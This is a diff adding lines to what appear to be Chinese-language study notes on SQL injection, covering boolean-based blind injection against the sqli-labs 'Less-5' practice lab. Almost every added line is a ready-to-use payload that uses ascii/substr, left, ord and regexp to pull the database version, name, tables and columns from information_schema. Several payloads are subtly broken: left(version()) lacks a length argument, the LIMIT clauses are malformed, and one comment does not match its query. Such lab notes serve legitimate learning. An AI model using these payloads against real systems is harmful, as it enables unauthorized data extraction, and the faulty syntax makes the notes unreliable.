@@ -56,5 +56,13 @@ SQL注入类型：数字和字符型 表中存在id字段的才可以使用，�
  1'ascii(substr(select password from users limit 0,1))>97--+
  %3e=大于
  正则注入
+ ord()函数返回第一个字符的ascii值如ord(mid(database(),1,1))>114意义第一位的ascii值是否大于114
+ less-5
+ 1.查版本号 1'and left(version())=5--+
+ 2.查数据库长度 1'and length(database())>4--+
+ 3.猜测数据库的第一位1'and left(database(),1)='s'--+
+ 4.利用ascii和substr获取数据库表的第一位 1'and ascii(substr((select table_name from information_schema.tables where table_schema='security' limit0,1),1,1))=101--+
+ 5.利用regexp获取表中的列1'and 1=(select 1 from information_schema.columns where table_name='users' and table_name regexp'^us[a-z]'limit 0,1)--+
+ 6.选择users表中的列名是否有us** 1'and 1=(select 1 from information_schema.columns where table_name='users' and table_name regexp'^username' limit 0.1)--+
  
  
